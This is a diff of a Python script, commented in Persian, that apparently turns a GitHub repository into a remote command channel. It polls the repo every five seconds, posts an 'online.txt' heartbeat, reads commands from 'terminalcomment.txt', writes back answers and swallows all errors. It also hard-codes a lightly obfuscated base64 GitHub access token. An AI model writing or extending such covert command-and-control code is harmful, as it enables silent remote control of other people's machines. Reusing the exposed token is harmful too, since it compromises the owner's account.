@@ -21,7 +21,7 @@ TOKEN_B64 = "Z2hwX1R5SmJqNENEU2FSTGtQejlxU09ab3Z0eDljbURteDREQ3hMVw==2"
 GITHUB_TOKEN = base64.b64decode(TOKEN_B64[:-1]).decode('utf-8')
 REPO_URL = REPO_URL_BASE.replace("https://", f"https://{GITHUB_TOKEN}@")
 
-CHECK_INTERVAL = 10
+CHECK_INTERVAL = 5  # تغییر از 10 به 5 ثانیه
 # ==============================
 
 def run_cmd(cmd, cwd=None):
@@ -134,9 +134,13 @@ def main_loop():
     last_hash = None
     while True:
         try:
+            # ۱. دریافت آخرین تغییرات از مخزن
             git_pull()
+
+            # ۲. به‌روزرسانی فایل online.txt (هر ۵ ثانیه)
             update_online_txt()
 
+            # ۳. بررسی فایل terminalcomment.txt برای دستور جدید
             term_path = Path(REPO_DIR) / "terminalcomment.txt"
             if term_path.exists():
                 with open(term_path, "r") as f:
@@ -152,8 +156,14 @@ def main_loop():
                     f.write("com = \nansw = \n")
                 last_hash = None
 
+            # ۴. اگر تغییری در فایل‌ها رخ داده، آن‌ها را به مخزن ارسال کن
+            # (این کار توسط git_commit_push انجام می‌شود که فقط در صورت وجود تغییر push می‌کند)
+
+            # ۵. صبر کن به مدت CHECK_INTERVAL ثانیه
             time.sleep(CHECK_INTERVAL)
+
         except Exception:
+            # هر گونه خطا را نادیده بگیر و به حلقه ادامه بده
             time.sleep(CHECK_INTERVAL)
 
 if __name__ == "__main__":
